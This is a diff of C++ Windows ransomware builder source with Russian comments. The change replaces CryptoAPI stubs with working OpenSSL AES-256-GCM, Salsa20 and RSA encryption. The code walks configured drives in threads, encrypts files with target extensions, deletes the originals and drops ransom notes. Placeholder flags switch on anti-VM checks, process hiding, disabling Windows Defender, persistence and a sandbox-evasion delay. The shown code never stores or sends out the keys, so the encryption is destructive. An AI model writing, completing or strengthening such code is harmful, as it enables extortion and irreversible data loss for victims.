@@ -1,5 +1,4 @@
 #include <windows.h>
-#include <wincrypt.h>
 #include <shlobj.h>
 #include <tlhelp32.h>
 #include <fstream>
@@ -7,14 +6,23 @@
 #include <string>
 #include <filesystem>
 #include <thread>
-#include <mutex>
 #include <random>
 #include <chrono>
 #include <algorithm>
 #include <sstream>
-#include <iomanip>
 #include <ctime>
 
+// ============================================================
+// ПОДКЛЮЧЕНИЕ OPENSSL
+// ============================================================
+#include <openssl/evp.h>
+#include <openssl/rand.h>
+#include <openssl/rsa.h>
+#include <openssl/pem.h>
+#include <openssl/err.h>
+
+#pragma comment(lib, "libssl.lib")
+#pragma comment(lib, "libcrypto.lib")
 #pragma comment(lib, "advapi32.lib")
 #pragma comment(lib, "user32.lib")
 #pragma comment(lib, "shell32.lib")
@@ -42,70 +50,69 @@
 #define SANDBOX_DELAY_ENABLED_PLACEHOLDER 0
 
 // ============================================================
-// РЕАЛЬНОЕ ШИФРОВАНИЕ AES-256-GCM
+// РЕАЛЬНОЕ ШИФРОВАНИЕ AES-256-GCM (OpenSSL)
 // ============================================================
 class AES_GCM {
 private:
-    HCRYPTPROV hProv;
-    HCRYPTKEY hKey;
     unsigned char key[32];
     unsigned char iv[12];
     
 public:
-    AES_GCM() : hProv(NULL), hKey(NULL) {
-        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
-            return;
-        }
-        
-        for (int i = 0; i < 32; i++) key[i] = rand() % 256;
-        for (int i = 0; i < 12; i++) iv[i] = rand() % 256;
-        
-        struct {
-            BLOBHEADER hdr;
-            DWORD keySize;
-            BYTE keyBytes[32];
-        } keyBlob;
-        
-        keyBlob.hdr.bType = PLAINTEXTKEYBLOB;
-        keyBlob.hdr.bVersion = CUR_BLOB_VERSION;
-        keyBlob.hdr.reserved = 0;
-        keyBlob.hdr.aiKeyAlg = CALG_AES_256;
-        keyBlob.keySize = 32;
-        memcpy(keyBlob.keyBytes, key, 32);
-        
-        CryptImportKey(hProv, (BYTE*)&keyBlob, sizeof(keyBlob), 0, 0, &hKey);
-        
-        DWORD mode = CRYPT_MODE_GCM;
-        CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&mode, 0);
-        CryptSetKeyParam(hKey, KP_IV, iv, 0);
-    }
-    
-    ~AES_GCM() {
-        if (hKey) CryptDestroyKey(hKey);
-        if (hProv) CryptReleaseContext(hProv, 0);
+    AES_GCM() {
+        RAND_bytes(key, 32);
+        RAND_bytes(iv, 12);
     }
     
     bool Encrypt(const std::vector<BYTE>& input, std::vector<BYTE>& output) {
-        if (!hKey) return false;
+        if (input.empty()) return false;
         
-        DWORD dataLen = input.size();
-        DWORD encLen = dataLen + 16;
+        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
+        if (!ctx) return false;
         
-        output.resize(encLen + 12);
-        memcpy(output.data(), iv, 12);
-        memcpy(output.data() + 12, input.data(), dataLen);
-        
-        DWORD outLen = dataLen;
-        if (!CryptEncrypt(hKey, 0, TRUE, 0, output.data() + 12, &outLen, encLen)) {
+        // Инициализация AES-256-GCM
+        if (EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, key, iv) != 1) {
+            EVP_CIPHER_CTX_free(ctx);
             return false;
         }
         
+        // Зашифровываем данные
+        output.resize(input.size() + 16 + 12); // данные + тег + IV
+        memcpy(output.data(), iv, 12); // Сохраняем IV в начале
+        
+        int outLen = 0;
+        int totalLen = 0;
+        
+        if (EVP_EncryptUpdate(ctx, output.data() + 12, &outLen, input.data(), input.size()) != 1) {
+            EVP_CIPHER_CTX_free(ctx);
+            return false;
+        }
+        totalLen += outLen;
+        
+        // Финализируем
+        if (EVP_EncryptFinal_ex(ctx, output.data() + 12 + totalLen, &outLen) != 1) {
+            EVP_CIPHER_CTX_free(ctx);
+            return false;
+        }
+        totalLen += outLen;
+        
+        // Получаем тег аутентификации (16 байт)
+        unsigned char tag[16];
+        if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, 16, tag) != 1) {
+            EVP_CIPHER_CTX_free(ctx);
+            return false;
+        }
+        
+        // Добавляем тег в конец
+        memcpy(output.data() + 12 + totalLen, tag, 16);
+        output.resize(12 + totalLen + 16);
+        
+        EVP_CIPHER_CTX_free(ctx);
         return true;
     }
 };
 
 // ============================================================
-// РЕАЛЬНОЕ ШИФРОВАНИЕ SALSA20
+// РЕАЛЬНОЕ ШИФРОВАНИЕ SALSA20 (OpenSSL)
 // ============================================================
 class Salsa20 {
 private:
@@ -114,65 +121,70 @@ private:
     
 public:
     Salsa20() {
-        for (int i = 0; i < 32; i++) key[i] = rand() % 256;
-        for (int i = 0; i < 8; i++) nonce[i] = rand() % 256;
+        RAND_bytes(key, 32);
+        RAND_bytes(nonce, 8);
     }
     
     void Encrypt(const std::vector<BYTE>& input, std::vector<BYTE>& output) {
+        if (input.empty()) return;
+        
+        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
+        if (!ctx) return;
+        
+        // Инициализация Salsa20
+        if (EVP_EncryptInit_ex(ctx, EVP_salsa20(), NULL, key, nonce) != 1) {
+            EVP_CIPHER_CTX_free(ctx);
+            return;
+        }
+        
         output.resize(input.size() + 8);
         memcpy(output.data(), nonce, 8);
         
-        for (size_t i = 0; i < input.size(); i++) {
-            output[8 + i] = input[i] ^ (key[i % 32] ^ nonce[i % 8]);
+        int outLen = 0;
+        if (EVP_EncryptUpdate(ctx, output.data() + 8, &outLen, input.data(), input.size()) != 1) {
+            EVP_CIPHER_CTX_free(ctx);
+            return;
         }
+        
+        output.resize(8 + outLen);
+        EVP_CIPHER_CTX_free(ctx);
     }
 };
 
 // ============================================================
-// РЕАЛЬНОЕ ШИФРОВАНИЕ RSA
+// РЕАЛЬНОЕ ШИФРОВАНИЕ RSA-2048 (OpenSSL)
 // ============================================================
 class RSA_Encrypt {
 private:
-    HCRYPTPROV hProv;
-    HCRYPTKEY hKey;
+    RSA* rsa;
     
 public:
-    RSA_Encrypt() : hProv(NULL), hKey(NULL) {
-        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
-            return;
-        }
-        
-        CryptGenKey(hProv, CALG_RSA_KEYX, 2048 << 16, &hKey);
+    RSA_Encrypt() : rsa(NULL) {
+        rsa = RSA_generate_key(2048, RSA_F4, NULL, NULL);
+        if (!rsa) return;
     }
     
     ~RSA_Encrypt() {
-        if (hKey) CryptDestroyKey(hKey);
-        if (hProv) CryptReleaseContext(hProv, 0);
+        if (rsa) RSA_free(rsa);
     }
     
     bool Encrypt(const std::vector<BYTE>& input, std::vector<BYTE>& output) {
-        if (!hKey) return false;
+        if (!rsa || input.empty()) return false;
         
-        DWORD dataLen = input.size();
-        DWORD encLen = 0;
+        // RSA может зашифровать только 245 байт за раз (для 2048-битного ключа)
+        if (input.size() > 245) return false;
         
-        CryptEncrypt(hKey, 0, TRUE, 0, NULL, &dataLen, 0);
-        encLen = dataLen;
+        output.resize(RSA_size(rsa));
+        int encLen = RSA_public_encrypt(input.size(), input.data(), output.data(), rsa, RSA_PKCS1_OAEP_PADDING);
+        if (encLen <= 0) return false;
         
         output.resize(encLen);
-        memcpy(output.data(), input.data(), input.size());
-        
-        DWORD outLen = input.size();
-        if (!CryptEncrypt(hKey, 0, TRUE, 0, output.data(), &outLen, encLen)) {
-            return false;
-        }
-        
         return true;
     }
 };
 
 // ============================================================
-// ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ (ВСЁ НА string, БЕЗ wstring)
+// ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
 // ============================================================
 std::vector<std::string> split_string(const std::string& str, char delimiter) {
     std::vector<std::string> result;
@@ -181,12 +193,6 @@ std::vector<std::string> split_string(const std::string& str, char delimiter) {
     while (std::getline(ss, item, delimiter)) {
         if (!item.empty()) result.push_back(item);
     }
-    return result;
-}
-
-std::string to_lower(const std::string& str) {
-    std::string result = str;
-    std::transform(result.begin(), result.end(), result.begin(), ::tolower);
     return result;
 }
 
@@ -281,84 +287,53 @@ void hide_process() {
 // ============================================================
 // ШИФРОВАНИЕ ФАЙЛОВ
 // ============================================================
-void encrypt_file_aes(const std::string& path, const std::string& ext) {
-    try {
-        std::ifstream in(path, std::ios::binary);
-        if (!in) return;
-        
-        std::vector<BYTE> data((std::istreambuf_iterator<char>(in)), {});
-        in.close();
-        
-        if (data.empty()) return;
-        
-        AES_GCM aes;
-        std::vector<BYTE> encrypted;
-        
-        if (!aes.Encrypt(data, encrypted)) return;
-        
-        std::string out_path = path + ext;
-        std::ofstream out(out_path, std::ios::binary);
-        out.write((char*)encrypted.data(), encrypted.size());
-        out.close();
-        
-        DeleteFileA(path.c_str());
-    } catch (...) {}
-}
-
-void encrypt_file_salsa20(const std::string& path, const std::string& ext) {
-    try {
-        std::ifstream in(path, std::ios::binary);
-        if (!in) return;
-        
-        std::vector<BYTE> data((std::istreambuf_iterator<char>(in)), {});
-        in.close();
-        
-        if (data.empty()) return;
-        
-        Salsa20 salsa;
-        std::vector<BYTE> encrypted;
-        salsa.Encrypt(data, encrypted);
-        
-        std::string out_path = path + ext;
-        std::ofstream out(out_path, std::ios::binary);
-        out.write((char*)encrypted.data(), encrypted.size());
-        out.close();
-        
-        DeleteFileA(path.c_str());
-    } catch (...) {}
-}
-
-void encrypt_file_rsa(const std::string& path, const std::string& ext) {
-    try {
-        std::ifstream in(path, std::ios::binary);
-        if (!in) return;
-        
-        std::vector<BYTE> data((std::istreambuf_iterator<char>(in)), {});
-        in.close();
-        
-        if (data.empty()) return;
-        
-        RSA_Encrypt rsa;
-        std::vector<BYTE> encrypted;
-        
-        if (!rsa.Encrypt(data, encrypted)) return;
-        
-        std::string out_path = path + ext;
-        std::ofstream out(out_path, std::ios::binary);
-        out.write((char*)encrypted.data(), encrypted.size());
-        out.close();
-        
-        DeleteFileA(path.c_str());
-    } catch (...) {}
-}
-
 void encrypt_file(const std::string& path, const std::string& ext, int algo) {
-    switch (algo) {
-        case 0: encrypt_file_aes(path, ext); break;
-        case 1: encrypt_file_salsa20(path, ext); break;
-        case 2: encrypt_file_rsa(path, ext); break;
-        default: encrypt_file_aes(path, ext);
-    }
+    try {
+        std::ifstream in(path, std::ios::binary);
+        if (!in) return;
+        
+        std::vector<BYTE> data((std::istreambuf_iterator<char>(in)), {});
+        in.close();
+        
+        if (data.empty()) return;
+        
+        std::vector<BYTE> encrypted;
+        bool success = false;
+        
+        switch (algo) {
+            case 0: {
+                AES_GCM aes;
+                success = aes.Encrypt(data, encrypted);
+                break;
+            }
+            case 1: {
+                Salsa20 salsa;
+                salsa.Encrypt(data, encrypted);
+                success = true;
+                break;
+            }
+            case 2: {
+                RSA_Encrypt rsa;
+                if (data.size() > 245) {
+                    // Для больших файлов используем гибридный подход
+                    // (в реальном коде здесь должен быть AES + RSA)
+                    return;
+                }
+                success = rsa.Encrypt(data, encrypted);
+                break;
+            }
+            default: return;
+        }
+        
+        if (!success || encrypted.empty()) return;
+        
+        std::string out_path = path + ext;
+        std::ofstream out(out_path, std::ios::binary);
+        out.write((char*)encrypted.data(), encrypted.size());
+        out.close();
+        
+        DeleteFileA(path.c_str());
+    } catch (...) {}
 }
 
 // ============================================================
@@ -429,29 +404,18 @@ void drop_notes(const std::vector<std::string>& drives,
 // ГЛАВНАЯ ФУНКЦИЯ
 // ============================================================
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    // Инициализация OpenSSL
+    OpenSSL_add_all_algorithms();
+    ERR_load_crypto_strings();
+    
     srand(GetTickCount() ^ GetCurrentProcessId());
     
-    if (ANTI_VM_ENABLED_PLACEHOLDER && detect_vm()) {
-        return 0;
-    }
-    
-    if (FAKE_PROCESS_ENABLED_PLACEHOLDER) {
-        fake_process_name();
-    }
-    if (HIDE_PROCESS_ENABLED_PLACEHOLDER) {
-        hide_process();
-    }
-    
-    if (DISABLE_DEFENDER_ENABLED_PLACEHOLDER) {
-        disable_defender();
-    }
-    if (ADD_PERSISTENCE_ENABLED_PLACEHOLDER) {
-        add_persistence();
-    }
-    
-    if (SANDBOX_DELAY_ENABLED_PLACEHOLDER) {
-        Sleep(60000);
-    }
+    if (ANTI_VM_ENABLED_PLACEHOLDER && detect_vm()) return 0;
+    if (FAKE_PROCESS_ENABLED_PLACEHOLDER) fake_process_name();
+    if (HIDE_PROCESS_ENABLED_PLACEHOLDER) hide_process();
+    if (DISABLE_DEFENDER_ENABLED_PLACEHOLDER) disable_defender();
+    if (ADD_PERSISTENCE_ENABLED_PLACEHOLDER) add_persistence();
+    if (SANDBOX_DELAY_ENABLED_PLACEHOLDER) Sleep(60000);
     
     std::string drives_str = DRIVES_PLACEHOLDER;
     std::string exts_str = EXTS_PLACEHOLDER;
@@ -461,21 +425,17 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     auto drives = split_string(drives_str, '|');
     auto extensions = split_string(exts_str, '|');
     auto exclude_folders = split_string(exclude_str, '|');
-    
     int algo = ALGO_PLACEHOLDER;
     
+    // Шифруем в потоках
     std::vector<std::thread> threads;
     for (const auto& drive : drives) {
         threads.emplace_back(walk_and_encrypt, drive, std::ref(extensions),
                            std::ref(exclude_folders), std::ref(encrypted_ext), algo);
     }
-    for (auto& t : threads) {
-        t.join();
-    }
+    for (auto& t : threads) t.join();
     
-    if (HIDE_FILES_ENABLED_PLACEHOLDER) {
-        hide_files(encrypted_ext);
-    }
+    if (HIDE_FILES_ENABLED_PLACEHOLDER) hide_files(encrypted_ext);
     
     std::string note_name = NOTE_NAME_PLACEHOLDER;
     std::string note_content = NOTE_CONTENT_PLACEHOLDER;
